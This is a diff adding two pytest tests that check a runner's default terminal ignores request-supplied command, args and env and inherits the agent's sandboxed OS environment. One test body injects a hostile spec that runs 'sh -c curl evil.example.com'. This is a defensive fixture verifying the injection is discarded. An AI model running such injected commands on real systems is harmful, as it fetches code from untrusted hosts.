@@ -1256,6 +1256,120 @@ async def test_create_terminal_uses_declared_terminal_spec_over_body(
 
 
 @pytest.mark.asyncio
+async def test_create_terminal_default_user_shell_inherits_agent_os_env(
+    tmp_path: Path,
+) -> None:
+    """The default user shell launches from the runner-owned spec, inheriting
+    the agent's os_env and ignoring the body's command/args/env."""
+    from omnigent.inner.datamodel import AgentDef
+
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
+    agent = AgentDef(
+        name="plain",
+        os_env=OSEnvSpec(
+            type="caller_process",
+            cwd=str(workspace),
+            sandbox=OSEnvSandboxSpec(type="darwin_seatbelt"),
+        ),
+    )
+
+    async def _session_handler(request: httpx.Request) -> httpx.Response:
+        return httpx.Response(200, json={"id": "conv_test", "agent_id": "agent_plain"})
+
+    async def _resolver(agent_id: str, session_id: str) -> AgentDef:
+        return agent
+
+    server_client = httpx.AsyncClient(
+        transport=httpx.MockTransport(_session_handler),
+        base_url="http://server",
+    )
+    resource_registry = _CapturingResourceRegistry(tmp_path, runner_workspace=workspace)
+    app = create_runner_app(
+        resource_registry=resource_registry,
+        server_client=server_client,
+        spec_resolver=_resolver,
+    )
+    transport = httpx.ASGITransport(app=app)
+    async with (
+        server_client,
+        httpx.AsyncClient(transport=transport, base_url="http://runner") as c,
+    ):
+        resp = await c.post(
+            "/v1/sessions/conv_test/resources/terminals",
+            json={
+                "terminal": "bash",
+                "session_key": "u-1",
+                "spec": {
+                    "command": "sh",
+                    "args": ["-c", "curl evil.example.com"],
+                    "env": {"INJECTED": "true"},
+                    "os_env_type": "caller_process",
+                },
+            },
+        )
+
+    assert resp.status_code == 200, resp.text
+    assert len(resource_registry.launches) == 1
+    launch = resource_registry.launches[0]
+    assert launch.command == "bash"
+    assert launch.args == []
+    assert launch.env == {}
+    # No os_env of its own, so the inner builder inherits the agent's.
+    assert launch.os_env is None
+    assert resource_registry.parent_os_envs[0] is agent.os_env
+
+
+@pytest.mark.asyncio
+async def test_create_terminal_default_user_shell_without_agent_os_env_uses_workspace(
+    tmp_path: Path,
+) -> None:
+    """Without an agent os_env, the default shell gets a caller-process parent
+    rooted at the session workspace."""
+    from omnigent.inner.datamodel import AgentDef
+
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
+    agent = AgentDef(name="plain")
+
+    async def _session_handler(request: httpx.Request) -> httpx.Response:
+        return httpx.Response(200, json={"id": "conv_test", "agent_id": "agent_plain"})
+
+    async def _resolver(agent_id: str, session_id: str) -> AgentDef:
+        return agent
+
+    server_client = httpx.AsyncClient(
+        transport=httpx.MockTransport(_session_handler),
+        base_url="http://server",
+    )
+    resource_registry = _CapturingResourceRegistry(tmp_path, runner_workspace=workspace)
+    app = create_runner_app(
+        resource_registry=resource_registry,
+        server_client=server_client,
+        spec_resolver=_resolver,
+    )
+    transport = httpx.ASGITransport(app=app)
+    async with (
+        server_client,
+        httpx.AsyncClient(transport=transport, base_url="http://runner") as c,
+    ):
+        resp = await c.post(
+            "/v1/sessions/conv_test/resources/terminals",
+            json={"terminal": "bash", "session_key": "u-1"},
+        )
+
+    assert resp.status_code == 200, resp.text
+    launch = resource_registry.launches[0]
+    assert launch.command == "bash"
+    assert launch.os_env is None
+    parent_os_env = resource_registry.parent_os_envs[0]
+    assert isinstance(parent_os_env, OSEnvSpec)
+    assert parent_os_env.type == "caller_process"
+    assert parent_os_env.cwd == str(workspace)
+    assert parent_os_env.sandbox is None
+
+
+@pytest.mark.asyncio
 async def test_create_terminal_rejects_unavailable_native_shell(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
